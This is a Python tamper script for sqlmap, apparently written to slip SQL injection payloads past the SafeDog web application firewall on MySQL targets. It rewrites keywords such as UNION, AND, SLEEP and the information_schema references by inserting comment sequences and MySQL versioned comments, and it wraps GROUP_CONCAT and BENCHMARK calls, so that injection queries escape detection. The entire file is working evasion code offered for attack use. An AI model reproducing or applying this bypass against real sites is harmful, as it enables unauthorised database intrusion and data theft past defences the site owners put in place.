#!/usr/bin/env python
"""
Author:lemonlove7
"""
import os,re
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS


priority = PRIORITY.HIGHEST

def dependencies():
        singleTimeWarnMessage("安全狗tamper脚本(%s)--Author:lemonlove7 '%s'" % (DBMS.MYSQL,os.path.basename(__file__).split(".")[0]))

def tamper(payload, **kwargs):
        payload=payload.replace('AND','and/*/+-+*/')
        payload=payload.replace('ORDER','order/*/+-+*/')
        payload=payload.replace("UNION",'union/*/-+-*/')
        payload=payload.replace("EXTRACTVALUE","EXTRACTVALUE/*/+-+*/")
        payload=payload.replace("SLEEP(","SLEEP/*/--/*/(")
        payload=payload.replace("UPDATEXML(","UPDATEXML/*/+-+*/(")
        payload=payload.replace("DATABASE(","DATABASE/*/--/*/(")
        payload=payload.replace("information_schema.tables","/*!-- *//*%0ainformation_schema./*!tables*/")
        payload=payload.replace(" USER()"," USER/*/--/*/()")
        payload=payload.replace(" AS"," /*!14400AS*/")
        payload=payload.replace("CURRENT_USER()","CURRENT_USER/*/-+-*/()")

        payload=payload.replace("SESSION_USER()","/*!-- *//*%0aSESSION_USER()*/")
        payload=payload.replace("INFORMATION_SCHEMA.SCHEMATA","/*!-- *//*%0aINFORMATION_SCHEMA./*!SCHEMATA*/")
        payload=payload.replace("INFORMATION_SCHEMA.COLUMNS","/*!-- *//*%0aINFORMATION_SCHEMA./*!COLUMNS*/")
        payload=payload.replace("INFORMATION_SCHEMA.TABLES","/*!-- *//*%0aINFORMATION_SCHEMA./*!TABLES*/")
        def pd(payload):
                falg=''
                if 'GROUP_CONCAT' in payload:
                        falg='GROUP_CONCAT'
                if 'BENCHMARK' in payload:
                        falg='BENCHMARK'
                payload1 = re.findall(f'{falg}\((.*?)\)',payload)
                payload1 = "(" + "".join(payload1) + ")"
                payload = re.sub(f'{falg}\((.*?)\)', f'/*!14400{falg}{payload1}', payload)+'*/'
                return payload
        if 'GROUP_CONCAT' in payload:
                payload=pd(payload)
        if 'BENCHMARK' in payload:
                payload=pd(payload)


        #payload=payload.replace("SELECT","/*!11440SELECT*/")
        #payload=payload.replace("SLEEP(","sleep/*!77777cz*/(")
        #payload=payload.replace("UPDATEXML(","UPDATEXML/*!77777cz*/(")
        #payload=payload.replace("SESSION_USER()","/*!11440SESSION_USER()*/")
        #payload=payload.replace("USER(())","USER/*!77777cz*/))")
        #payload=payload.replace("DATABASE()","DATABASE/*!77777cz*/()")
        return payload

# print(tamper(payload='CAST'))